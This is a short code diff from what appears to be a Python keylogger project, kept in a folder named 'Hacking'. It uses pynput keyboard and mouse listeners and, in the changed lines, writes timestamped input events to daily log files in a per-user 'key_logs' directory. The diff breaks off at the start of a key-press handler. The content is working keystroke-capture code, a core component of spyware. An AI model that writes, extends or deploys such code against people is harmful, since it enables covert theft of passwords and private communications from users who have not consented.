@@ -1,11 +1,16 @@
 from pynput import keyboard, mouse
 from datetime import datetime
+from datetime import date
+from getpass import getuser
+import os
 
-file = r"E:\coding\Hacking\resources\data.log"
+folder = os.path.join("C:\\Users", getuser(), "key_logs")
+
+os.makedirs(folder, exist_ok=True)
 
 def write(event_type, details):
     time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    with open(file, "a") as f:
+    with open(fr'{folder}\{date.today()}_keyLog.txt', "at") as f:
         f.write(f"{time} - [{event_type}] {details}\n")
 
 def onPress(key):
